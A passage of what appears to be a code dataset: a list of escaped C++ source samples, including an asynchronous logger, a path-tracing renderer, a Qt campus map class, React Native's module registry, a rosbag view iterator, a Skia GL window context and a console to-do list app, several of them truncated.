fclose(m_fp);\n        char tail[16] = {0};\n       \n        snprintf(tail, 16, \"%d_%02d_%02d_\", my_tm.tm_year + 1900, my_tm.tm_mon + 1, my_tm.tm_mday);\n       \n        if (m_today != my_tm.tm_mday) {\n            snprintf(new_log, 255, \"%s%s%s\", dir_name, tail, log_name);\n            m_today = my_tm.tm_mday;\n            m_count = 0;\n        }\n        else {\n            snprintf(new_log, 255, \"%s%s%s.%lld\", dir_name, tail, log_name, m_count / m_split_lines);\n        }\n        m_fp = fopen(new_log, \"a\");\n    }\n    m_mutex.unlock();\n\n    va_list valst;\n    va_start(valst, format);\n\n    string log_str;\n    m_mutex.lock();\n    //\u5199\u5165\u7684\u5177\u4f53\u65f6\u95f4\u5185\u5bb9\u683c\u5f0f\n    int n = snprintf(m_buf, 48, \"%d-%02d-%02d %02d:%02d:%02d.%06ld %s \",\n                     my_tm.tm_year + 1900, my_tm.tm_mon + 1, my_tm.tm_mday,\n                     my_tm.tm_hour, my_tm.tm_min, my_tm.tm_sec, now.tv_usec, s);\n    //vsnprintf \u51fd\u6570\u7684\u529f\u80fd\u662f\u6839\u636e\u6307\u5b9a\u7684\u683c\u5f0f format \u548c\u53ef\u53d8\u53c2\u6570\u5217\u8868 valst \u5c06\u683c\u5f0f\u5316\u7684\u5b57\u7b26\u4e32\u5199\u5165\u5230\u7f13\u51b2\u533a\u4e2d\uff0c\u5e76\u8fd4\u56de\u5199\u5165\u7684\u5b57\u7b26\u6570\n    int m = vsnprintf(m_buf + n, m_log_buf_size - n - 1, format, valst);\n    m_buf[n + m] = '\\n'; //n, m\u90fd\u4ee3\u8868\u5df2\u7ecf\u5199\u4e86\u591a\u5c11\u5b57\u7b26\n    m_buf[n + m + 1] = '\\0';\n    log_str = m_buf; //log_str\u4ee3\u8868\u4e00\u4e2a\u5199\u5b8c\u7684log\uff0c\u7b49\u5f85\u771f\u6b63\u5199\u5165\u6587\u4ef6\n    m_mutex.unlock();\n\n    if (m_is_async && !m_log_queue->full()) {\n        m_log_queue->push(log_str);\n    } else {\n        //\u5982\u679c\u662f\u540c\u6b65\uff0c\u76f4\u63a5\u5199\u5165\n        m_mutex.lock();\n        fputs(log_str.c_str(), m_fp);\n        m_mutex.unlock();\n    }\n    va_end(valst);\n}\n\nvoid Log::flush(void) {\n    m_mutex.lock();\n    //\u5f3a\u5236\u5237\u65b0\u5199\u5165\u6d41\u7f13\u51b2\u533a\n    fflush(m_fp);\n    m_mutex.unlock();\n}",
    "#include <algorithm>\n#include <cfloat>\n#include <cstdlib>\n#include <fstream>\n#include <iostream>\n#define STB_IMAGE_IMPLEMENTATION\nconst double PI = 3.141592653;\n\n#include \"box.h\"\n#include \"bvh.h\"\n#include \"camera.h\"\n#include \"hitablelist.h\"\n#include \"jyorand.h\"\n#include \"kuinkerm.h\"\n#include \"material.h\"\n#include \"onb.h\"\n#include \"pdf.h\"\n#include \"perlin.h\"\n#include \"rectangle.h\"\n#include \"smoke.h\"\n#include \"sphere.h\"\n#include \"stb_image.h\"\n#include \"texture.h\"\n#include \"transformation.h\"\n#include \"tiny_ldt.h\"\n\nusing namespace std;\n\nRand jyorandengine;\nhitable_list world;\n\n// \u62d2\u7edd\u65b9\u6cd5\u968f\u673a\u751f\u6210\u7403\u5185\u4e00\u70b9\nvec3 randomInUnitSphere() {\n  vec3 p;\n  do {\n    p = vec3(jyorandengine.jyoRandGetReal<double>(-1, 1),\n             jyorandengine.jyoRandGetReal<double>(-1, 1),\n             jyorandengine.jyoRandGetReal<double>(-1, 1));\n  } while (p.squared_length() >= 1.0);\n  return p;\n}\n\n// \u62d2\u7edd\u65b9\u6cd5\u968f\u673a\u751f\u6210\u534a\u7403\u5185\u4e00\u70b9\nvec3 randomInHemisphere(const vec3& normal) {\n  // \u968f\u673a\u751f\u6210\u4e00\u4e2a\u5355\u4f4d\u7403\u5185\u7684\u70b9\n  vec3 in_unit_sphere = randomInUnitSphere();\n  // \u5982\u679c\u70b9\u5728\u6cd5\u7ebf\u65b9\u5411\u7684\u534a\u7403\u4e0a\n  if (dot(in_unit_sphere, normal) > 0.0)\n    return in_unit_sphere;  // \u8fd4\u56de\u8be5\u70b9\u4f5c\u4e3a\u6563\u5c04\u65b9\u5411\n  else\n    return -in_unit_sphere;  // \u5426\u5219\u8fd4\u56de\u8be5\u70b9\u7684\u53cd\u65b9\u5411\u4f5c\u4e3a\u6563\u5c04\u65b9\u5411\n}\n\n// \u62d2\u7edd\u65b9\u6cd5\u968f\u673a\u751f\u6210\u5706\u5185\u4e00\u70b9\nvec3 randomInUnitDisk() {\n  vec3 p;\n  do {\n    p = vec3(jyorandengine.jyoRandGetReal<double>(-1, 1),\n             jyorandengine.jyoRandGetReal<double>(-1, 1), 0);\n  } while (p.squared_length() >= 1.0);\n  return p;\n}\n\n// \u53cd\u6f14\u65b9\u6cd5\u4f59\u5f26\u91c7\u6837\u751f\u6210\u534a\u7403\u9762\u4e0a\u4e00\u70b9\nvec3 randomCosineDirection() {\n  auto r1 = jyorandengine.jyoRandGetReal<double>(0, 1);\n  auto r2 = jyorandengine.jyoRandGetReal<double>(0, 1);\n\n  auto phi = 2 * PI * r1;\n  auto x = cos(phi) * sqrt(r2);\n  auto y = sin(phi) * sqrt(r2);\n  auto z = sqrt(1 - r2);\n\n  return vec3(x, y, z);\n}\n\ntiny_ldt<float>::light ldt;\nvector<vector<float>> intensityDis;\n\nfloat getIntesiy(float C, float gamma){\n  assert(C>=0 && C<=2*M_PI && gamma>=0 && gamma<=M_PI);\n  int Cindex = floor(C/M_PI*180.0/ldt.dc);\n  int gammaindex = floor(gamma/M_PI*180.0/ldt.dg);\n  if(gamma==0.0 || gamma==180.0)\n    return intensityDis[Cindex][gammaindex];\n  float d = 0.0;\n  while(d+ldt.dg<=gamma/M_PI*180.0)\n    d += ldt.dg;\n  float a = 1.0-(gamma/M_PI*180.0-d)/ldt.dg;\n  return a*intensityDis[Cindex][gammaindex]+(1-a)*intensityDis[Cindex][gammaindex+1];\n}\n\n// \u989c\u8272\u7740\u8272\nvec3 color(const ray& in, int depth) {\n  hit_record rec;\n  // \u51cf\u5c11\u8bef\u5dee\uff0c-0.00001\u4e5f\u53ef\u4ee5\u662f\u4ea4\u70b9\n  if (world.hitanything(in, 0.001, DBL_MAX, rec)) {\n    scatter_record srec;\n    vec3 emitted = rec.mat_ptr->emitted(in, rec, rec.u, rec.v, rec.p);\n    if (depth < 5 && rec.mat_ptr->scatter(in, rec, srec)) {\n      // \u91d1\u5c5e\u548c\u73bb\u7483\u6750\u8d28\u8df3\u8fc7pdf\n      if (srec.skip_pdf)\n        return srec.attenuation * color(srec.out_ray, depth + 1);\n\n      // \u6563\u5c04\u5149\u7ebf\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\n      double scatteringpdf = rec.mat_ptr->scattering_pdf(in, rec, srec.out_ray);\n      // \u4e00\u4e9b\u5149\u6e90\u7167\u5c04\u4e0d\u5230\u7684\u5730\u65b9\uff0c\u8fd4\u56de-1\n      if (srec.pdf == -1)\n        return emitted;\n      return emitted + scatteringpdf * srec.attenuation *\n                           color(srec.out_ray, depth + 1) / srec.pdf;\n    } else {\n      // \u76f4\u89c6\u5149\u6e90\u5219\u53ef\u4ee5\u770b\u5230\u5149\u6e90\u539f\u672c\u7684\u989c\u8272\n      // if (!depth) emitted.make_unit_vector();\n      vec3 v = unit_vector(-in.direction());\n      return emitted*getIntesiy(atan2(-v.y(), -v.z()) + M_PI, M_PI - acos(v.x()))/abs(dot(unit_vector(in.direction()-in.origin()), unit_vector(vec3(-1, 0, 0))))/(85 - 30) / (355 - 300);\n    }\n  } else {\n    // \u5565\u4e5f\u6ca1\u6253\u5230\n    return vec3(0, 0, 0);\n  }\n  exit(0);\n}\n\nstd::vector<shared_ptr<hitable>> worldlist;\nvoid buildWorld() {\n  texture* whitelightptr = new constant_texture(vec3(1000, 1000, 1000));\n  texture* mikuptr = new constant_texture(vec3(0.223, 0.773, 0.733));\n  texture* redptr = new constant_texture(vec3(0.65, 0.05, 0.05));\n  texture* whiteptr = new constant_texture(vec3(0.73, 0.73, 0.73));\n  texture* greenptr = new constant_texture(vec3(0.12, 0.45, 0.15));\n  texture* groundtexptr = new constant_texture(vec3(0.48, 0.83, 0.53));\n  texture* metalptr = new constant_texture(vec3(0.8, 0.85, 0.88));\n  texture* checkertextptr =\n      new checker_texture(new constant_texture(vec3(0.2, 0.3, 0.1)),\n                          new constant_texture(vec3(0.9, 0.9, 0.9)));\n\n  texture* metaltextureptr = new constant_texture(\n      vec3(0.5 * (1 + jyorandengine.jyoRandGetReal<double>(0, 1) *\n                          jyorandengine.jyoRandGetReal<double>(0, 1)),\n           0.5 * (1 + jyorandengine.jyoRandGetReal<double>(0, 1) *\n                          jyorandengine.jyoRandGetReal<double>(0, 1)),\n           0.5 * (1 + jyorandengine.jyoRandGetReal<double>(0, 1) *\n                          jyorandengine.jyoRandGetReal<double>(0, 1))));\n  texture* noisetextptr = new noise_texture(0.01);\n\n  int nx, ny, nn;\n  unsigned char* tex_data = stbi_load(\"earthmap.jpg\", &nx, &ny, &nn, 0);\n  texture* imagetextureptr = new image_texture(tex_data, nx, ny);\n\n  // worldlist.emplace_back(\n  //     new rectangle_yz(0, 555, 0, 555, 555, new lambertian(whiteptr)));\n  // worldlist.emplace_back(\n  //     new rectangle_yz(0, 555, 0, 555, 0, new lambertian(greenptr)));\n  // worldlist.emplace_back(new rectangle_xz(213, 343, 22",
    "#include \"campus_map.h\"\n\nCampusMap::CampusMap(QObject* parent) : QObject{parent} {}\n\nint CampusMap::AddNode(double pos_x, double pos_y) {\n  if (map_coordinate.contains({pos_x, pos_y})) {\n    return map_coordinate[{pos_x, pos_y}];\n  }\n  node_count++;\n  Node node(node_count, pos_x, pos_y);\n  nodes.append(node);\n  node_map[node_count] = node;\n  map_coordinate[{pos_x, pos_y}] = node_count;\n  emit NodeAdded(node);\n  return node_count;\n}\n\nvoid CampusMap::AddEdge(const QPair<double, double>& start,\n                        const QPair<double, double>& end) {\n  edge_count++;\n  double length =\n      sqrt(pow(start.first - end.first, 2) + pow(start.second - end.second, 2));\n  int node_one_id = AddNode(start.first, start.second);\n  int node_two_id = AddNode(end.first, end.second);\n  Edge edge(edge_count, node_one_id, node_two_id, length);\n  edges.append(edge);\n  edge_map[edge_count] = edge;\n  emit EdgeAdded(edge);\n}\n\nvoid CampusMap::ReadNodeSlot(const Node& node) {\n  nodes.push_back(node);\n  node_map[node.id] = node;\n  map_coordinate[{node.pos_x, node.pos_y}] = node.id;\n  node_count++;\n}\n\nvoid CampusMap::ReadEdgeSlot(const Edge& edge) {\n  edges.push_back(edge);\n  edge_map[edge.id] = edge;\n  edge_count++;\n}\n\nvoid CampusMap::ReadInfoSlot(const Info& info) {\n  infos.push_back(info);\n  info_map[info.id] = info;\n  info_count++;\n}\n\nvoid CampusMap::AddEdgeSlot(const QVector<QPair<double, double>>& coordinates) {\n  if (coordinates.size() <= 1) return;\n\n  QVector<QPair<double, double>>::ConstIterator ci;\n  for (ci = coordinates.constBegin(); ci != coordinates.constEnd() - 1; ++ci) {\n    QPair<double, double> start = *ci;\n    QPair<double, double> end = *(ci + 1);\n    AddEdge(start, end);\n  }\n}\n\nvoid CampusMap::AddInfoSlot(int node_id, const QString& name,\n                            const QString& description,\n                            const QByteArray& image_data) {\n  if (name.isEmpty()) {\n    qDebug() << \"Empty name\";\n    return;\n  }\n\n  if (description.isEmpty()) {\n    qDebug() << \"Empty description\";\n    return;\n  }\n\n  if (!node_map.contains(node_id)) {\n    qDebug() << \"Node ID\" << node_id << \"does not exist.\";\n    return;\n  }\n\n  Node& node = node_map[node_id];\n\n  if (node.info_valid) {\n    qDebug() << \"Info already exists.\";\n    return;\n  }\n\n  QImage image;\n  if (!image.loadFromData(image_data)) {\n    qDebug() << \"The data is not a valid image\";\n    return;\n  }\n\n  node.info_id = ++info_count;\n  node.info_valid = true;\n\n  Info info(info_count, name, description);\n\n  infos.append(info);\n  info_map[info_count] = info;\n  emit InfoAdded(info, image_data);\n}\n\nvoid CampusMap::EditInfoSlot(const Info& new_info, const QByteArray& image_data,\n                             const UpdateFlags& flags) {\n  if (!info_map.contains(new_info.id)) {\n    qDebug() << \"Info ID\" << new_info.id << \"does not exist.\";\n    return;\n  }\n\n  if (image_data.size() > MAX_SIZE) {\n    qDebug() << \"image size exceeds 2MB limit\";\n    return;\n  }\n\n  Info& info = info_map[new_info.id];\n\n  QStringList updates;\n  if (flags.update_name) {\n    info.name = new_info.name;\n    updates.append(\"name updated\");\n  }\n  if (flags.update_description) {\n    info.description = new_info.description;\n    updates.append(\"description updated\");\n  }\n  if (flags.update_image) {\n    updates.append(\"image_data updated\");\n  }\n  if (updates.isEmpty()) {\n    qDebug() << \"No fields marked for update.\";\n    return;\n  }\n\n  emit InfoEdited(new_info, image_data, flags);\n}\n\nvoid CampusMap::DeleteInfoSlot(int node_id) {\n  if (!node_map.contains(node_id)) {\n    qDebug() << \"Node ID\" << node_id << \"does not exist.\";\n    return;\n  }\n\n  Node& node = node_map[node_id];\n\n  if (!node.info_valid) {\n    qDebug() << \"Site is not valid\";\n    return;\n  }\n\n  int info_id = node.info_id;\n  info_map.remove(info_id);\n  node.info_id = 0;\n  node.info_valid = false;\n\n  emit InfoDeleted(info_id);\n}\n\nvoid CampusMap::GetInfoFromIdSlot(int info_id, Sender sender) {\n  last_sender = sender;\n  if (info_map.contains(info_id)) {\n    last_info_id = info_id;\n    emit RequestImageData(info_id);\n  } else {\n    emit InfoNotFound(sender);\n  }\n}\n\nvoid CampusMap::GetSiteSlot(Sender sender) {\n  last_sender = sender;\n  QVector<QPair<QPair<double, double>, QString>> sites;\n  for (const auto& it : nodes)\n    if (it.info_valid) {\n      QString name = info_map[it.info_id].name;\n      sites.append({{it.pos_x, it.pos_y}, name});\n    }\n  emit SitesFound(sites, sender);\n}\n\nvoid CampusMap::SearchNodeSlot(double pos_x, double pos_y, Sender sender) {\n  last_sender = sender;\n  QMap<int, Node>::const_iterator ci;\n  for (ci = node_map.constBegin(); ci != node_map.constEnd(); ++ci) {\n    const auto& node = ci.value();\n    if (pow(node.pos_x - pos_x, 2) + pow(node.pos_y - pos_y, 2) <=\n        RADIUS * RADIUS) {\n      emit NodeFound(*ci, sender);\n      return;\n    }\n  }\n  emit NodeNotFound(sender);\n}\n\nvoid CampusMap::HandleImageDataFetchedSlot(const QByteArray& image_data) {\n  emit InfoFound(info_map[last_info_id], image_data, last_sender);\n}\n\nvoid C",
    "/*\n * Copyright (c) Meta Platforms, Inc. and affiliates.\n *\n * This source code is licensed under the MIT license found in the\n * LICENSE file in the root directory of this source tree.\n */\n\n#include \"ModuleRegistry.h\"\n\n#include <glog/logging.h>\n#include <reactperflogger/BridgeNativeModulePerfLogger.h>\n\n#include \"NativeModule.h\"\n#include \"SystraceSection.h\"\n\nnamespace facebook::react {\n\nnamespace {\n\nstd::string normalizeName(std::string name) {\n  // TODO mhorowitz #10487027: This is super ugly.  We should just\n  // change iOS to emit normalized names, drop the \"RK...\" from\n  // names hardcoded in Android, and then delete this and the\n  // similar hacks in js.\n  if (name.compare(0, 3, \"RCT\") == 0) {\n    return name.substr(3);\n  } else if (name.compare(0, 2, \"RK\") == 0) {\n    return name.substr(2);\n  }\n  return name;\n}\n\n} // namespace\n\nModuleRegistry::ModuleRegistry(\n    std::vector<std::unique_ptr<NativeModule>> modules,\n    ModuleNotFoundCallback callback)\n    : modules_{std::move(modules)}, moduleNotFoundCallback_{callback} {}\n\nvoid ModuleRegistry::updateModuleNamesFromIndex(size_t index) {\n  for (; index < modules_.size(); index++) {\n    std::string name = normalizeName(modules_[index]->getName());\n    modulesByName_[name] = index;\n  }\n}\n\nvoid ModuleRegistry::registerModules(\n    std::vector<std::unique_ptr<NativeModule>> modules) {\n  SystraceSection s_(\"ModuleRegistry::registerModules\");\n  // Noop if there are no NativeModules to add\n  if (modules.empty()) {\n    return;\n  }\n\n  if (modules_.empty() && unknownModules_.empty()) {\n    modules_ = std::move(modules);\n  } else {\n    size_t modulesSize = modules_.size();\n    size_t addModulesSize = modules.size();\n    bool addToNames = !modulesByName_.empty();\n    modules_.reserve(modulesSize + addModulesSize);\n    std::move(modules.begin(), modules.end(), std::back_inserter(modules_));\n    if (!unknownModules_.empty()) {\n      for (size_t index = modulesSize; index < modulesSize + addModulesSize;\n           index++) {\n        std::string name = normalizeName(modules_[index]->getName());\n        auto it = unknownModules_.find(name);\n        if (it != unknownModules_.end()) {\n          throw std::runtime_error(folly::to<std::string>(\n              \"module \",\n              name,\n              \" was required without being registered and is now being registered.\"));\n        } else if (addToNames) {\n          modulesByName_[name] = index;\n        }\n      }\n    } else if (addToNames) {\n      updateModuleNamesFromIndex(modulesSize);\n    }\n  }\n}\n\nstd::vector<std::string> ModuleRegistry::moduleNames() {\n  SystraceSection s_(\"ModuleRegistry::moduleNames\");\n  std::vector<std::string> names;\n  for (size_t i = 0; i < modules_.size(); i++) {\n    std::string name = normalizeName(modules_[i]->getName());\n    modulesByName_[name] = i;\n    names.push_back(std::move(name));\n  }\n  return names;\n}\n\nstd::optional<ModuleConfig> ModuleRegistry::getConfig(const std::string& name) {\n  SystraceSection s(\"ModuleRegistry::getConfig\", \"module\", name);\n\n  // Initialize modulesByName_\n  if (modulesByName_.empty() && !modules_.empty()) {\n    moduleNames();\n  }\n\n  auto it = modulesByName_.find(name);\n\n  if (it == modulesByName_.end()) {\n    if (unknownModules_.find(name) != unknownModules_.end()) {\n      BridgeNativeModulePerfLogger::moduleJSRequireBeginningFail(name.c_str());\n      BridgeNativeModulePerfLogger::moduleJSRequireEndingStart(name.c_str());\n      return std::nullopt;\n    }\n\n    if (!moduleNotFoundCallback_) {\n      unknownModules_.insert(name);\n      BridgeNativeModulePerfLogger::moduleJSRequireBeginningFail(name.c_str());\n      BridgeNativeModulePerfLogger::moduleJSRequireEndingStart(name.c_str());\n      return std::nullopt;\n    }\n\n    BridgeNativeModulePerfLogger::moduleJSRequireBeginningEnd(name.c_str());\n\n    bool wasModuleLazilyLoaded = moduleNotFoundCallback_(name);\n    it = modulesByName_.find(name);\n\n    bool wasModuleRegisteredWithRegistry =\n        wasModuleLazilyLoaded && it != modulesByName_.end();\n\n    if (!wasModuleRegisteredWithRegistry) {\n      BridgeNativeModulePerfLogger::moduleJSRequireEndingStart(name.c_str());\n      unknownModules_.insert(name);\n      return std::nullopt;\n    }\n  } else {\n    BridgeNativeModulePerfLogger::moduleJSRequireBeginningEnd(name.c_str());\n  }\n\n  // If we've gotten this far, then we've signaled moduleJSRequireBeginningEnd\n\n  size_t index = it->second;\n\n  CHECK(index < modules_.size());\n  NativeModule* module = modules_[index].get();\n\n  // string name, object constants, array methodNames (methodId is index),\n  // [array promiseMethodIds], [array syncMethodIds]\n  folly::dynamic config = folly::dynamic::array(name);\n\n  {\n    SystraceSection s_(\"ModuleRegistry::getConstants\", \"module\", name);\n    /**\n     * In the case that there are constants, we'll initialize the NativeModule,\n     * and signal moduleJSRequireEndingStart. Otherwise, we'll simply signal the\n     * event. The Module will be initialized when we invoke one of its\n     * Native",
    "// Copyright (c) 2009, Willow Garage, Inc.\n// All rights reserved.\n// \n// Redistribution and use in source and binary forms, with or without\n// modification, are permitted provided that the following conditions are met:\n// \n//     * Redistributions of source code must retain the above copyright\n//       notice, this list of conditions and the following disclaimer.\n//     * Redistributions in binary form must reproduce the above copyright\n//       notice, this list of conditions and the following disclaimer in the\n//       documentation and/or other materials provided with the distribution.\n//     * Neither the name of Willow Garage, Inc. nor the names of its\n//       contributors may be used to endorse or promote products derived from\n//       this software without specific prior written permission.\n// \n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE\n// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n// POSSIBILITY OF SUCH DAMAGE.\n\n#include \"rosbag/view.h\"\n#include \"rosbag/bag.h\"\n#include \"rosbag/message_instance.h\"\n\n#include <set>\n#include <assert.h>\n#include <algorithm>\n\nusing std::map;\nusing std::string;\nusing std::vector;\nusing std::multiset;\n\nnamespace rosbag {\n\n// View::iterator\n\nView::iterator::iterator() : view_(NULL), view_revision_(0), message_instance_(NULL) { }\n\nView::iterator::~iterator()\n{\n  if (message_instance_ != NULL)\n    delete message_instance_;\n}\n\nView::iterator::iterator(View* view, bool end) : view_(view), view_revision_(0), message_instance_(NULL) {\n    if (view != NULL && !end)\n        populate();\n}\n\nView::iterator::iterator(const iterator& i) : view_(i.view_), iters_(i.iters_), view_revision_(i.view_revision_), message_instance_(NULL) { }\n\nView::iterator &View::iterator::operator=(iterator const& i) {\n    if (this != &i) {\n        view_ = i.view_;\n        iters_ = i.iters_;\n        view_revision_ = i.view_revision_;\n        if (message_instance_ != NULL) {\n            delete message_instance_;\n            message_instance_ = NULL;\n        }\n    }\n    return *this;\n}\n\nvoid View::iterator::populate() {\n    assert(view_ != NULL);\n\n    iters_.clear();\n    for( MessageRange const * range : view_->ranges_ )\n        if (range->begin != range->end)\n            iters_.push_back(ViewIterHelper(range->begin, range));\n\n    std::sort(iters_.begin(), iters_.end(), ViewIterHelperCompare());\n    view_revision_ = view_->view_revision_;\n}\n\nvoid View::iterator::populateSeek(multiset<IndexEntry>::const_iterator iter) {\n    assert(view_ != NULL);\n\n    iters_.clear();\n    for( MessageRange const * range : view_->ranges_ )\n    {\n        multiset<IndexEntry>::const_iterator start = std::lower_bound(range->begin, range->end, iter->time, IndexEntryCompare());\n        if (start != range->end)\n            iters_.push_back(ViewIterHelper(start, range));\n    }\n\n    std::sort(iters_.begin(), iters_.end(), ViewIterHelperCompare());\n    while (iter != iters_.back().iter)\n        increment();\n\n    view_revision_ = view_->view_revision_;\n}\n\nbool View::iterator::equal(View::iterator const& other) const {\n    // We need some way of verifying these are actually talking about\n    // the same merge_queue data since we shouldn't be able to compare\n    // iterators from different Views.\n\n    if (iters_.empty())\n        return other.iters_.empty();\n    if (other.iters_.empty())\n        return false;\n\n    return iters_.back().iter == other.iters_.back().iter;\n}\n\nvoid View::iterator::increment() {\n    assert(view_ != NULL);\n\n    // Our message instance is no longer valid\n    if (message_instance_ != NULL)\n    {\n      delete message_instance_;\n      message_instance_ = NULL;\n    }\n\n    view_->update();\n\n    // Note, updating may have blown away our message-ranges and\n    // replaced them in general the ViewIterHelpers are no longer\n    // valid, but the iterator it stores should still be good.\n    if (view_revision_ != view_->view_revision_)\n        populateSeek(iters_.back().iter);\n\n    if (view_->reduce_overlap_)\n    {\n        std::multiset<IndexEntry>::const_iterator last_iter = iters_.back().iter;\n    \n        while (iters_.back().iter == last_iter)\n        {\n            iters_.back().iter++;\n            if (iters_.back().iter == iters_.back().range->end)\n                iters_.pop_back();\n      \n            std::sort(iters_.begin(), iters_.end(), ViewIterHelperCompare());\n    ",
    "/*\n * Copyright 2023 Google LLC\n *\n * Use of this source code is governed by a BSD-style license that can be\n * found in the LICENSE file.\n */\n\n#include \"GLWindowContext.h\"\n#include \"common/common.h\"\n#include \"include/core/SkCanvas.h\"\n#include \"include/core/SkSurface.h\"\n#include \"include/gpu/GrBackendSurface.h\"\n#include \"include/gpu/GrDirectContext.h\"\n#include \"include/gpu/ganesh/SkSurfaceGanesh.h\"\n#include \"include/gpu/ganesh/gl/GrGLBackendSurface.h\"\n#include \"src/base/SkMathPriv.h\"\n#include <GLES3/gl3.h>\n#include \"src/gpu/ganesh/gl/GrGLDefines.h\"\n#include \"include/gpu/ganesh/gl/GrGLDirectContext.h\"\n#include <hilog/log.h>\n\nnamespace skwindow::internal {\n\nGLWindowContext::GLWindowContext(const DisplayParams& params)\n        : WindowContext(params)\n        , fBackendContext(nullptr)\n        , fSurface(nullptr) {\n    fDisplayParams.fMSAASampleCount = GrNextPow2(fDisplayParams.fMSAASampleCount);\n}\n\nvoid GLWindowContext::initializeContext() {\n    SkASSERT(!fContext);\n\n    fBackendContext = this->onInitializeContext();\n\n    fContext = GrDirectContexts::MakeGL(fBackendContext, fDisplayParams.fGrContextOptions);\n    if (!fContext && fDisplayParams.fMSAASampleCount > 1) {\n        fDisplayParams.fMSAASampleCount /= 2;\n        this->initializeContext();\n        return;\n    }\n}\n\nvoid GLWindowContext::destroyContext() {\n    fSurface.reset(nullptr);\n\n    if (fContext) {\n        // in case we have outstanding refs to this (lua?)\n        fContext->abandonContext();\n        fContext.reset();\n    }\n\n    fBackendContext.reset(nullptr);\n\n    this->onDestroyContext();\n}\n\nsk_sp<SkSurface> GLWindowContext::getBackbufferSurface() {\n    if (nullptr == fSurface) {\n        if (fContext) {\n            GrGLint buffer;\n            glGetIntegerv(GR_GL_FRAMEBUFFER_BINDING, &buffer);\n\n            GrGLFramebufferInfo fbInfo;\n            fbInfo.fFBOID = buffer;\n            fbInfo.fFormat = GR_GL_RGBA8;\n            fbInfo.fProtected = skgpu::Protected(fDisplayParams.fCreateProtectedNativeBackend);;\n\n            auto backendRT = GrBackendRenderTargets::MakeGL(fWidth,\n                                                            fHeight,\n                                                            fSampleCount,\n                                                            fStencilBits,\n                                                            fbInfo);\n            OH_LOG_Print(LOG_APP, LOG_ERROR, LOG_PRINT_DOMAIN, \"GLWindowContext\",\n                         \"getBackbufferSurface: canvas size, gl width = %{public}d  height = %{public}d\", fWidth, fHeight);\n            fSurface = SkSurfaces::WrapBackendRenderTarget(fContext.get(),\n                                                           backendRT,\n                                                           kBottomLeft_GrSurfaceOrigin,\n                                                           kRGBA_8888_SkColorType,\n                                                           fDisplayParams.fColorSpace,\n                                                           &fDisplayParams.fSurfaceProps);\n        }\n    }\n\n    return fSurface;\n}\n\nvoid GLWindowContext::resize(int w, int h) {\n    this->destroyContext();\n    this->initializeContext();\n}\n\nvoid GLWindowContext::setDisplayParams(const DisplayParams& params) {\n    fDisplayParams = params;\n    this->destroyContext();\n    this->initializeContext();\n}\n\n}  // namespace skwindow::internal\n",
    "#include <iostream>\n#include <string>\n#include <vector>\n\nusing namespace std;\n\n// Define Task class\nclass Task {\nprivate:\n    string name; // Task name\n    string description; // Task description\n    string dueDate; // Task due date\n    bool completed; // Task completion status\n\npublic:\n    // Constructor to initialize a task\n    Task(const string& name, const string& description, const string& dueDate)\n        : name(name), description(description), dueDate(dueDate), completed(false) {}\n\n    // Getters\n    string getName() const { return name; }\n    string getDescription() const { return description; }\n    string getDueDate() const { return dueDate; }\n    bool isCompleted() const { return completed; }\n\n    // Setters\n    void setName(const string& newName) { name = newName; }\n    void setDescription(const string& newDescription) { description = newDescription; }\n    void setDueDate(const string& newDueDate) { dueDate = newDueDate; }\n\n    // Mark the task as completed\n    void markCompleted() { completed = true; }\n\n    // Display task details\n    void displayTask() const {\n        cout << name << \" (\" << (completed ? \"Completed\" : \"Pending\") << \") - Due: \" << dueDate << endl;\n        cout << \"   Description: \" << description << endl;\n    }\n};\n\n// Define ToDoList class\nclass ToDoList {\nprivate:\n    vector<Task> tasks; // List of tasks\n\npublic:\n    // Display the menu\n    void displayMenu() const {\n        cout << \"\\n---------- To-Do List Menu -----------\\n\";\n        cout << \"1. Add Task\\n\";\n        cout << \"2. Delete Task\\n\";\n        cout << \"3. Display Tasks\\n\";\n        cout << \"4. Mark Task as Completed\\n\";\n        cout << \"5. Edit Task\\n\";\n        cout << \"6. Exit\\n\";\n        cout << \"-----------------------------------------\\n\";\n    }\n\n    // Add a new task\n    void addTask() {\n        string name, description, dueDate;\n        cout << \"Enter task name: \";\n        cin.ignore();\n        getline(cin, name);\n        cout << \"Enter task description: \";\n        getline(cin, description);\n        cout << \"Enter task due date (YYYY-MM-DD): \";\n        getline(cin, dueDate);\n\n        tasks.emplace_back(name, description, dueDate);\n        cout << \"Task added successfully!\" << endl;\n    }\n\n    // Delete a task\n    void deleteTask() {\n        if (tasks.empty()) {\n            cout << \"No tasks to delete!\" << endl;\n            return;\n        }\n        cout << \"Tasks:\" << endl;\n        for (size_t i = 0; i < tasks.size(); ++i) {\n            cout << i + 1 << \". \" << tasks[i].getName() << endl;\n        }\n        cout << \"Enter the task number to delete: \";\n        int taskNumber;\n        cin >> taskNumber;\n        if (taskNumber >= 1 && taskNumber <= tasks.size()) {\n            tasks.erase(tasks.begin() + taskNumber - 1);\n            cout << \"Task deleted successfully!\" << endl;\n        } else {\n            cout << \"Invalid task number!\" << endl;\n        }\n    }\n\n    // Display all tasks\n    void displayTasks() const {\n        if (tasks.empty()) {\n            cout << \"No tasks to display!\" << endl;\n            return;\n        }\n        cout << \"Tasks:\" << endl;\n        for (size_t i = 0; i < tasks.size(); ++i) {\n            cout << i + 1 << \". \";\n            tasks[i].displayTask();\n        }\n    }\n\n    // Mark a task as completed\n    void markTaskCompleted() {\n        if (tasks.empty()) {\n            cout << \"No tasks to mark as completed!\" << endl;\n            return;\n        }\n        cout << \"Tasks:\" << endl;\n        for (size_t i = 0; i < 